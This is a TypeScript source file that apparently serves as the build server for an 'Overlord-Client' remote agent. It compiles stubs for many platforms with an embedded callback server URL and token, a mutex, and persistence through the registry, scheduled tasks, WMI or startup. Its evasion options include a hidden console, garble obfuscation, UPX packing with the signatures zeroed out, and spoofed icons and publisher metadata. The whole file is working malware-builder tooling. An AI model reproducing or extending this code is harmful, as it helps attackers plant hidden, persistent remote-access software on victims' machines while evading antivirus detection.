import { $ } from "bun";
import path from "path";
import fs from "fs";
import { v4 as uuidv4 } from "uuid";
import { saveBuild } from "../db";
import { logger } from "../logger";
import { getConfig } from "../config";
import { ensureDataDir } from "../paths";
import * as buildManager from "../build/buildManager";
import type { BuildStream } from "../build/types";
import { ALLOWED_PLATFORMS } from "./validation-constants";
import { resolveRuntimeRoot } from "./runtime-paths";

function isClientModuleDir(dir: string): boolean {
  return (
    fs.existsSync(path.join(dir, "go.mod")) &&
    fs.existsSync(path.join(dir, "cmd", "agent"))
  );
}

function resolveClientModuleDir(rootDir: string): string | null {
  const candidates = [
    path.join(rootDir, "Overlord-Client"),
    path.join(rootDir, "..", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client"),
    path.join(rootDir, "dist", "Overlord-Client", "Overlord-Client"),
  ];

  for (const dir of candidates) {
    if (isClientModuleDir(dir)) {
      return dir;
    }
  }

  return null;
}

function resolveClientBuildCacheRoot(): string {
  const explicit = process.env.OVERLORD_CLIENT_BUILD_CACHE_DIR?.trim();
  if (explicit) {
    return path.resolve(explicit);
  }

  // Keep UI build caches under persistent app data by default.
  return path.resolve(ensureDataDir(), "client-build-cache");
}

function resolveAndroidNdkToolchainBin(): string | null {
  const ndkHome = (process.env.ANDROID_NDK_HOME || "/opt/android-ndk").trim();
  const hostArch = process.arch === "arm64" ? "linux-aarch64" : "linux-x86_64";
  const toolchainBin = path.join(ndkHome, "toolchains", "llvm", "prebuilt", hostArch, "bin");
  return fs.existsSync(toolchainBin) ? toolchainBin : null;
}

type BuildProcessConfig = {
  platforms: string[];
  serverUrl?: string;
  rawServerList?: boolean;
  mutex?: string;
  disableMutex?: boolean;
  stripDebug?: boolean;
  disableCgo?: boolean;
  obfuscate?: boolean;
  enablePersistence?: boolean;
  persistenceMethod?: string;
  hideConsole?: boolean;
  noPrinting?: boolean;
  builtByUserId?: number;
  outputName?: string;
  garbleLiterals?: boolean;
  garbleTiny?: boolean;
  garbleSeed?: string;
  assemblyTitle?: string;
  assemblyProduct?: string;
  assemblyCompany?: string;
  assemblyVersion?: string;
  assemblyCopyright?: string;
  iconBase64?: string;
  enableUpx?: boolean;
  upxStripHeaders?: boolean;
};

async function ensureUpxAvailable(sendToStream: (data: any) => void): Promise<string | null> {
  try {
    const check = await $`upx --version`.quiet().nothrow();
    if (check.exitCode === 0) {
      const ver = check.stdout.toString().split("\n")[0]?.trim() || "upx";
      sendToStream({ type: "output", text: `UPX found: ${ver}\n`, level: "info" });
      return "upx";
    }
  } catch {}

  sendToStream({ type: "output", text: "UPX not found, attempting auto-install...\n", level: "info" });

  const isWindows = process.platform === "win32";

  if (!isWindows) {
    try {
      const apt = await $`apt-get install -y upx-ucl 2>&1`.nothrow().quiet();
      if (apt.exitCode === 0) {
        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
        return "upx";
      }
    } catch {}
    try {
      const apt2 = await $`apt-get install -y upx 2>&1`.nothrow().quiet();
      if (apt2.exitCode === 0) {
        sendToStream({ type: "output", text: "UPX installed via apt-get\n", level: "info" });
        return "upx";
      }
    } catch {}
    try {
      const yum = await $`yum install -y upx 2>&1`.nothrow().quiet();
      if (yum.exitCode === 0) {
        sendToStream({ type: "output", text: "UPX installed via yum\n", level: "info" });
        return "upx";
      }
    } catch {}
  }

  if (isWindows) {
    try {
      const winget = await $`winget install --id upx.upx -e --accept-source-agreements --accept-package-agreements 2>&1`.nothrow().quiet();
      if (winget.exitCode === 0) {
        sendToStream({ type: "output", text: "UPX installed via winget\n", level: "info" });
        return "upx";
      }
    } catch {}
    try {
      const choco = await $`choco install upx -y 2>&1`.nothrow().quiet();
      if (choco.exitCode === 0) {
        sendToStream({ type: "output", text: "UPX installed via chocolatey\n", level: "info" });
        return "upx";
      }
    } catch {}
  }

  const arch = process.arch === "x64" ? "amd64" : process.arch === "arm64" ? "arm64" : "amd64";
  const plat = isWindows ? "win64" : "amd64_linux";
  const upxVersion = "4.2.4";
  const archiveName = `upx-${upxVersion}-${plat}`;
  const ext = isWindows ? "zip" : "tar.xz";
  const url = `https://github.com/upx/upx/releases/download/v${upxVersion}/${archiveName}.${ext}`;
  const tmpDir = path.join(ensureDataDir(), "upx-install");
  fs.mkdirSync(tmpDir, { recursive: true });
  const archivePath = path.join(tmpDir, `upx.${ext}`);

  try {
    sendToStream({ type: "output", text: `Downloading UPX from ${url}...\n`, level: "info" });
    const dlResult = await $`curl -fsSL -o ${archivePath} ${url}`.nothrow().quiet();
    if (dlResult.exitCode !== 0) {
      sendToStream({ type: "output", text: "WARNING: Failed to download UPX. Skipping compression.\n", level: "warn" });
      return null;
    }

    if (isWindows) {
      await $`tar -xf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
    } else {
      await $`tar -xJf ${archivePath} -C ${tmpDir}`.nothrow().quiet();
    }

    const upxBinName = isWindows ? "upx.exe" : "upx";
    const extractedDir = path.join(tmpDir, archiveName);
    const upxBin = path.join(extractedDir, upxBinName);

    if (fs.existsSync(upxBin)) {
      if (!isWindows) {
        await $`chmod +x ${upxBin}`.nothrow().quiet();
      }
      sendToStream({ type: "output", text: `UPX downloaded to ${upxBin}\n`, level: "info" });
      return upxBin;
    }

    sendToStream({ type: "output", text: "WARNING: UPX binary not found after extraction. Skipping compression.\n", level: "warn" });
    return null;
  } catch (err: any) {
    sendToStream({ type: "output", text: `WARNING: UPX auto-install failed: ${err.message || err}. Skipping compression.\n`, level: "warn" });
    return null;
  }
}

function stripUpxHeaders(filePath: string): boolean {
  try {
    const buf = Buffer.from(fs.readFileSync(filePath));
    const UPX_MAGIC = Buffer.from("UPX!");
    let modified = false;
    let offset = 0;
    while (offset < buf.length - 3) {
      const idx = buf.indexOf(UPX_MAGIC, offset);
      if (idx === -1) break;
      buf[idx] = 0x00;
      buf[idx + 1] = 0x00;
      buf[idx + 2] = 0x00;
      buf[idx + 3] = 0x00;
      modified = true;
      offset = idx + 4;
    }
    if (modified) {
      fs.writeFileSync(filePath, buf);
    }
    return modified;
  } catch {
    return false;
  }
}

const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);

type BuildProcessDeps = {
  generateBuildMutex: (length?: number) => string;
  sanitizeOutputName: (name: string) => string;
};

function detectAgentVersion(clientDir: string): string {
  try {
    const configPath = path.join(clientDir, "cmd", "agent", "config", "config.go");
    const content = fs.readFileSync(configPath, "utf8");
    const match = content.match(/var\s+AgentVersion\s*=\s*"([^"]+)"/);
    return match?.[1]?.trim() || "unknown";
  } catch {
    return "unknown";
  }
}

export async function startBuildProcess(
  buildId: string,
  config: BuildProcessConfig,
  deps: BuildProcessDeps,
): Promise<void> {
  const SEVEN_DAYS_MS = 7 * 24 * 60 * 60 * 1000;
  const BUILD_STREAM_HEARTBEAT_MS = 15_000;
  const now = Date.now();

  const build: BuildStream = {
    id: buildId,
    controllers: [],
    status: "running",
    startTime: now,
    expiresAt: now + SEVEN_DAYS_MS,
    files: [],
    userId: config.builtByUserId,
  };

  buildManager.addBuildStream(buildId, build);

  const sendToStream = (data: any) => {
    const encoder = new TextEncoder();
    const message = `data: ${JSON.stringify(data)}\n\n`;
    const encoded = encoder.encode(message);

    if (data.type === "output") {
      logger.info(`[build:${buildId.substring(0, 8)}] ${data.text.trimEnd()}`);
    } else if (data.type === "status") {
      logger.info(`[build:${buildId.substring(0, 8)}] STATUS: ${data.text}`);
    } else if (data.type === "error") {
      logger.error(`[build:${buildId.substring(0, 8)}] ERROR: ${data.error}`);
    }

    build.controllers.forEach((controller) => {
      try {
        controller.enqueue(encoded);
      } catch (err) {
        logger.error("[build] Failed to send to stream:", err);
      }
    });
  };

  let winresTempDir: string | null = null;
  const generatedSysoFiles: string[] = [];

  const buildStartedAt = Date.now();
  const keepAliveTimer = setInterval(() => {
    const elapsedMinutes = Math.floor((Date.now() - buildStartedAt) / 60_000);
    sendToStream({
      type: "heartbeat",
      elapsedMinutes,
      timestamp: Date.now(),
    });
  }, BUILD_STREAM_HEARTBEAT_MS);

  try {
    const serverConfig = getConfig();
    const buildAgentToken = (serverConfig.auth.agentToken || "").trim();

    sendToStream({ type: "status", text: "Preparing build environment..." });

    try {
      const goCheck = await $`go version`.quiet();
      const goVersion = goCheck.stdout.toString().trim();
      logger.info(`[build:${buildId.substring(0, 8)}] Using ${goVersion}`);
      sendToStream({ type: "output", text: `Using ${goVersion}\n`, level: "info" });
    } catch {
      const errorMsg = "Go is not installed or not in PATH. Please install Go from https://golang.org/dl/ and ensure it's in your system PATH.";
      logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg}`);
      sendToStream({ type: "output", text: `ERROR: ${errorMsg}\n`, level: "error" });
      sendToStream({ type: "error", error: errorMsg });
      sendToStream({ type: "complete", success: false });
      build.status = "failed";
      return;
    }

    const rootDir = resolveRuntimeRoot();
    const clientDir = resolveClientModuleDir(rootDir);
    if (!clientDir) {
      throw new Error(
        `Overlord-Client source not found (missing go.mod). Checked: ${path.join(rootDir, "dist", "Overlord-Client")}, ${path.join(rootDir, "Overlord-Client")}`,
      );
    }
    const agentVersion = detectAgentVersion(clientDir);
    const outDir = path.join(rootDir, "dist-clients");
    const cacheRoot = resolveClientBuildCacheRoot();
    const goBuildCacheDir = path.join(cacheRoot, "go-build");
    const goModCacheDir = path.join(cacheRoot, "go-mod");

    await Bun.$`mkdir -p ${outDir}`.quiet();
    fs.mkdirSync(goBuildCacheDir, { recursive: true });
    fs.mkdirSync(goModCacheDir, { recursive: true });
    sendToStream({ type: "output", text: `Build directory: ${outDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client source: ${clientDir}\n`, level: "info" });
    sendToStream({ type: "output", text: `Stub version: ${agentVersion}\n`, level: "info" });
    sendToStream({ type: "output", text: `Client build cache: ${cacheRoot}\n`, level: "info" });

    const platformsToBuild = (config.platforms || []).filter((p) => ALLOWED_PLATFORMS.has(p));
    if (platformsToBuild.length !== (config.platforms || []).length) {
      throw new Error("One or more requested platforms are not allowed");
    }

    const hasAndroidTargets = platformsToBuild.some((p) => p.startsWith("android-"));
    const hasBsdTargets = platformsToBuild.some(
      (p) => p.startsWith("freebsd-") || p.startsWith("openbsd-"),
    );

    if (hasAndroidTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: Android targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    if (hasBsdTargets) {
      sendToStream({
        type: "output",
        text: "WARNING: BSD targets are severely untested and will probably not work right.\n",
        level: "warn",
      });
    }

    const ndkBin = resolveAndroidNdkToolchainBin();
    if (!ndkBin && platformsToBuild.some((p) => p.startsWith("android-"))) {
      sendToStream({
        type: "output",
        text: "Warning: Android NDK not found. Android builds require the NDK. Install it to /opt/android-ndk or set the ANDROID_NDK_HOME environment variable.\n",
        level: "warn",
      });
    }

    let buildMutex = "";
    if (!config.disableMutex) {
      buildMutex = config.mutex || deps.generateBuildMutex();
      sendToStream({ type: "output", text: `Mutex: ${buildMutex}\n`, level: "info" });
    } else {
      sendToStream({ type: "output", text: "Mutex: disabled\n", level: "info" });
    }

    const buildTag = uuidv4();
    sendToStream({ type: "output", text: `Build tag: ${buildTag}\n`, level: "info" });

    if (config.outputName) {
      sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
    }

    let upxBin: string | null = null;
    if (config.enableUpx) {
      upxBin = await ensureUpxAvailable(sendToStream);
      if (!upxBin) {
        sendToStream({ type: "output", text: "WARNING: UPX could not be installed. Compression will be skipped.\n", level: "warn" });
      }
    }

    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64);
    const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));

    if (hasAssemblyData && hasWindowsTargets) {
      sendToStream({ type: "status", text: "Generating Windows resource data..." });

      const goEnvResult = await $`go env GOPATH`.quiet();
      const goPath = goEnvResult.stdout.toString().trim();
      const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
      const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
      let winresBin = "go-winres";

      let hasWinres = false;
      if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
        winresBin = path.join(goBinDir, winresExe);
        hasWinres = true;
      } else {
        try {
          await $`go-winres version`.quiet();
          hasWinres = true;
        } catch {
          try {
            sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
            if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
              winresBin = path.join(goBinDir, winresExe);
              hasWinres = true;
            }
          } catch (installErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to install go-winres: ${installErr.message || installErr}. Assembly data/icon will be skipped.\n`, level: "warn" });
          }
        }
      }

      if (hasWinres) {
        sendToStream({ type: "output", text: `Using go-winres: ${winresBin}\n`, level: "info" });
        winresTempDir = path.join(outDir, `.winres-${buildId.substring(0, 8)}`);
        fs.mkdirSync(winresTempDir, { recursive: true });

        const winresConfig: any = {};

        if (config.iconBase64) {
          try {
            const iconBuffer = Buffer.from(config.iconBase64, "base64");
            const iconPath = path.join(winresTempDir, "icon.ico");
            fs.writeFileSync(iconPath, iconBuffer);
            winresConfig["RT_GROUP_ICON"] = { "#1": { "0000": "icon.ico" } };
            sendToStream({ type: "output", text: `Icon embedded (${iconBuffer.length} bytes)\n`, level: "info" });
          } catch (iconErr: any) {
            sendToStream({ type: "output", text: `WARNING: Failed to process icon: ${iconErr.message}. Skipping icon.\n`, level: "warn" });
          }
        }

        const versionStr = config.assemblyVersion || "0.0.0.0";
        const versionInfo: any = {
          "0409": {
            "FileDescription": config.assemblyTitle || "",
            "ProductName": config.assemblyProduct || "",
            "CompanyName": config.assemblyCompany || "",
            "FileVersion": versionStr,
            "ProductVersion": versionStr,
            "LegalCopyright": config.assemblyCopyright || "",
            "OriginalFilename": config.outputName ? (config.outputName + ".exe") : "",
          },
        };

        winresConfig["RT_VERSION"] = {
          "#1": {
            "0000": {
              "fixed": {
                "file_version": versionStr,
                "product_version": versionStr,
              },
              "info": versionInfo,
            },
          },
        };

        const winresJsonPath = path.join(winresTempDir, "winres.json");
        fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
        sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });

        const sysoOutPrefix = path.join(clientDir, "cmd", "agent", "rsrc");
        try {
          const winresResult = await $`${winresBin} make --in ${winresJsonPath} --out ${sysoOutPrefix}`.cwd(winresTempDir).nothrow().quiet();
          if (winresResult.exitCode !== 0) {
            const stderr = winresResult.stderr.toString().trim();
            sendToStream({ type: "output", text: `WARNING: go-winres failed (exit ${winresResult.exitCode}): ${stderr}\nBuilding without assembly data.\n`, level: "warn" });
          } else {
            const agentDir = path.join(clientDir, "cmd", "agent");
            for (const f of fs.readdirSync(agentDir)) {
              if (f.startsWith("rsrc") && f.endsWith(".syso")) {
                generatedSysoFiles.push(path.join(agentDir, f));
              }
            }
            sendToStream({ type: "output", text: `Windows resources generated (${generatedSysoFiles.length} .syso files)\n`, level: "info" });
          }
        } catch (winresErr: any) {
          sendToStream({ type: "output", text: `WARNING: go-winres failed: ${winresErr.message || winresErr}. Building without assembly data.\n`, level: "warn" });
        }
      }
    }

    for (const platform of platformsToBuild) {
      const [os, arch, ...rest] = platform.split("-");
      const goarm = arch === "armv7" ? "7" : undefined;
      const actualArch = goarm ? "arm" : arch;
      const namePrefix = config.outputName || "agent";
      const outputName = deps.sanitizeOutputName(
        platform.includes("windows") ? `${namePrefix}-${platform}.exe` : `${namePrefix}-${platform}`,
      );

      sendToStream({ type: "status", text: `Building ${platform}...` });
      sendToStream({ type: "output", text: `\n=== Building ${platform} ===\n`, level: "info" });

      const env: NodeJS.ProcessEnv = {
        ...process.env,
        GOOS: os,
        GOARCH: actualArch,
        CGO_ENABLED: config.disableCgo === true ? "0" : "1",
        GOWORK: "off",
        GOCACHE: goBuildCacheDir,
        GOMODCACHE: goModCacheDir,
        ...(goarm ? { GOARM: goarm } : {}),
      };

      if (env.CGO_ENABLED === "1") {
        const targetKey = `${os}/${actualArch}${goarm ? `/v${goarm}` : ""}`;
        const cCompilerByTarget: Record<string, string> = {
          "linux/amd64": "gcc",
          "windows/amd64": "x86_64-w64-mingw32-gcc",
          "windows/386": "i686-w64-mingw32-gcc",
          ...(ndkBin ? {
            "android/amd64": path.join(ndkBin, "x86_64-linux-android21-clang"),
            "android/arm64": path.join(ndkBin, "aarch64-linux-android21-clang"),
            "android/arm/v7": path.join(ndkBin, "armv7a-linux-androideabi21-clang"),
          } : {}),
        };
        const cxxCompilerByTarget: Record<string, string> = {
          "linux/amd64": "g++",
          "windows/amd64": "x86_64-w64-mingw32-g++",
          "windows/386": "i686-w64-mingw32-g++",
          ...(ndkBin ? {
            "android/amd64": path.join(ndkBin, "x86_64-linux-android21-clang++"),
            "android/arm64": path.join(ndkBin, "aarch64-linux-android21-clang++"),
            "android/arm/v7": path.join(ndkBin, "armv7a-linux-androideabi21-clang++"),
          } : {}),
        };

        const cc = cCompilerByTarget[targetKey];
        const cxx = cxxCompilerByTarget[targetKey];
        if (cc) {
          env.CC = cc;
          sendToStream({ type: "output", text: `CGO compiler: ${cc}\n`, level: "info" });
        } else {
          sendToStream({
            type: "output",
            text: `CGO compiler not mapped for ${targetKey}; falling back to default compiler lookup\n`,
            level: "warn",
          });
        }
        if (cxx) {
          env.CXX = cxx;
        }
        if (os === "android" && ndkBin) {
          env.AR = path.join(ndkBin, "llvm-ar");
        }
      }

      let ldflags = config.stripDebug !== false ? "-s -w" : "";

      if (config.serverUrl) {
        const serverFlag = `-X overlord-client/cmd/agent/config.DefaultServerURL=${config.serverUrl}`;
        ldflags = `${ldflags} ${serverFlag}`;
        sendToStream({ type: "output", text: `Server URL: ${config.serverUrl}\n`, level: "info" });
      }

      if (config.rawServerList) {
        const rawServerFlag = "-X overlord-client/cmd/agent/config.DefaultServerURLIsRaw=true";
        ldflags = ldflags ? `${ldflags} ${rawServerFlag}` : rawServerFlag;
        sendToStream({ type: "output", text: "Raw server list: enabled\n", level: "info" });
      }

      if (buildMutex) {
        const mutexFlag = `-X overlord-client/cmd/agent/config.DefaultMutex=${buildMutex}`;
        ldflags = ldflags ? `${ldflags} ${mutexFlag}` : mutexFlag;
      }

      if (config.enablePersistence) {
        if (!platform.startsWith('android-')) {
          const persistenceFlag = "-X overlord-client/cmd/agent/config.DefaultPersistence=true";
          ldflags = ldflags ? `${ldflags} ${persistenceFlag}` : persistenceFlag;
          sendToStream({ type: "output", text: `Persistence enabled for ${platform}\n`, level: "info" });
          if (os === 'windows' && config.persistenceMethod && VALID_PERSISTENCE_METHODS.has(config.persistenceMethod)) {
            const methodFlag = `-X overlord-client/cmd/agent/persistence.DefaultPersistenceMethod=${config.persistenceMethod}`;
            ldflags = `${ldflags} ${methodFlag}`;
            sendToStream({ type: "output", text: `Persistence method: ${config.persistenceMethod}\n`, level: "info" });
          }
        } else {
          sendToStream({ type: "output", text: `Persistence is not supported on ${platform}, skipping...\n`, level: "warning" });
        }
      }

      if (buildAgentToken) {
        const agentTokenFlag = `-X overlord-client/cmd/agent/config.DefaultAgentToken=${buildAgentToken}`;
        ldflags = ldflags ? `${ldflags} ${agentTokenFlag}` : agentTokenFlag;
      }

      if (buildTag) {
        const buildTagFlag = `-X overlord-client/cmd/agent/config.DefaultBuildTag=${buildTag}`;
        ldflags = ldflags ? `${ldflags} ${buildTagFlag}` : buildTagFlag;
      }

      if (config.hideConsole && os === "windows") {
        const hideConsoleFlag = "-H=windowsgui";
        ldflags = ldflags ? `${ldflags} ${hideConsoleFlag}` : hideConsoleFlag;
        sendToStream({ type: "output", text: "Windows console hidden (GUI subsystem)\n", level: "info" });
      }

      if (config.obfuscate) {
        sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
        if (config.garbleLiterals) {
          sendToStream({ type: "output", text: "Garble: obfuscate literals (-literals)\n", level: "info" });
        }
        if (config.garbleTiny) {
          sendToStream({ type: "output", text: "Garble: tiny mode (-tiny)\n", level: "info" });
        }
        if (config.garbleSeed) {
          sendToStream({ type: "output", text: `Garble: seed=${config.garbleSeed}\n`, level: "info" });
        }
      }

      if (config.noPrinting) {
        sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
      }

      try {
        const buildTool = config.obfuscate ? "garble" : "go";
        const tagArg = config.noPrinting ? "-tags noprint " : "";
        logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
        logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);

        const garbleFlags: string[] = [];
        if (config.obfuscate) {
          if (config.garbleLiterals) garbleFlags.push("-literals");
          if (config.garbleTiny) garbleFlags.push("-tiny");
          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
        }

        const buildArgs: string[] = [];
        if (config.noPrinting) buildArgs.push("-tags", "noprint");
        if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
        buildArgs.push("-o", `${outDir}/${outputName}`, "./cmd/agent");

        let buildCmd;
        if (config.obfuscate) {
          const allArgs = [...garbleFlags, "build", ...buildArgs];
          buildCmd = $`garble ${allArgs}`;
        } else {
          buildCmd = $`go build ${buildArgs}`;
        }

        const proc = buildCmd.env(env).cwd(clientDir).nothrow();
        let result: any;
        for await (const line of proc.lines()) {
          const trimmed = line.trim();
          if (trimmed.length > 0) {
            sendToStream({ type: "output", text: line + "\n", level: "info" });
          }
        }

        result = await proc;

        logger.info(`[build:${buildId.substring(0, 8)}] Process exited with code: ${result.exitCode}`);

        if (result.exitCode !== 0) {
          const stderrText = result.stderr.toString();
          if (stderrText) {
            sendToStream({ type: "output", text: stderrText, level: "error" });
          }
          const errorMsg = `Build failed with exit code ${result.exitCode}\n`;
          sendToStream({ type: "output", text: errorMsg, level: "error" });
          throw new Error(`Build failed for ${platform}`);
        }

        const filePath = `${outDir}/${outputName}`;
        let finalSize = Bun.file(filePath).size;

        if (upxBin) {
          sendToStream({ type: "output", text: `Compressing ${outputName} with UPX...\n`, level: "info" });
          const originalSize = finalSize;
          try {
            const upxResult = await $`${upxBin} --best ${filePath}`.nothrow().quiet();
            if (upxResult.exitCode !== 0) {
              const stderr = upxResult.stderr.toString().trim();
              sendToStream({ type: "output", text: `WARNING: UPX compression failed (exit ${upxResult.exitCode}): ${stderr}\n`, level: "warn" });
            } else {
              finalSize = Bun.file(filePath).size;
              const ratio = ((1 - finalSize / originalSize) * 100).toFixed(1);
              sendToStream({ type: "output", text: `UPX compressed: ${originalSize} → ${finalSize} bytes (${ratio}% reduction)\n`, level: "info" });

              if (config.upxStripHeaders) {
                const stripped = stripUpxHeaders(filePath);
                if (stripped) {
                  finalSize = Bun.file(filePath).size;
                  sendToStream({ type: "output", text: `UPX headers stripped (signature removed)\n`, level: "info" });
                } else {
                  sendToStream({ type: "output", text: `WARNING: No UPX signatures found to strip\n`, level: "warn" });
                }
              }
            }
          } catch (upxErr: any) {
            sendToStream({ type: "output", text: `WARNING: UPX failed: ${upxErr.message || upxErr}\n`, level: "warn" });
          }
        }

        (build.files as any[]).push({
          name: outputName,
          filename: outputName,
          platform,
          version: agentVersion,
          size: finalSize,
        });
      } catch (err: any) {
        const errorMsg = `[ERROR] Failed to build ${platform}: ${err.message || err}\n`;
        logger.error(`[build:${buildId.substring(0, 8)}] ${errorMsg.trim()}`);
        sendToStream({ type: "output", text: errorMsg, level: "error" });
        throw err;
      }
    }

    build.status = "completed";
    logger.info(`[build:${buildId.substring(0, 8)}] Build completed successfully! Built ${build.files.length} file(s)`);
    sendToStream({ type: "output", text: `\n[OK] Build completed successfully!\n`, level: "success" });
    sendToStream({ type: "complete", success: true, files: build.files, buildId, expiresAt: build.expiresAt });

    saveBuild({
      id: build.id,
      status: build.status,
      startTime: build.startTime,
      expiresAt: build.expiresAt,
      files: build.files as any,
      buildTag,
      builtByUserId: config.builtByUserId,
    });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up expired build`);
      buildManager.deleteBuildStream(buildId);
    }, SEVEN_DAYS_MS);
  } catch (err: any) {
    build.status = "failed";
    logger.error(`[build:${buildId.substring(0, 8)}] Build failed:`, err);
    sendToStream({ type: "error", error: err.message || String(err) });
    sendToStream({ type: "complete", success: false, buildId });

    setTimeout(() => {
      logger.info(`[build:${buildId.substring(0, 8)}] Cleaning up failed build stream`);
      buildManager.deleteBuildStream(buildId);
    }, 60 * 60 * 1000);
  } finally {
    clearInterval(keepAliveTimer);
    for (const sysoFile of generatedSysoFiles) {
      try { fs.unlinkSync(sysoFile); } catch {}
    }
    if (winresTempDir) {
      try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
    }
  }
}
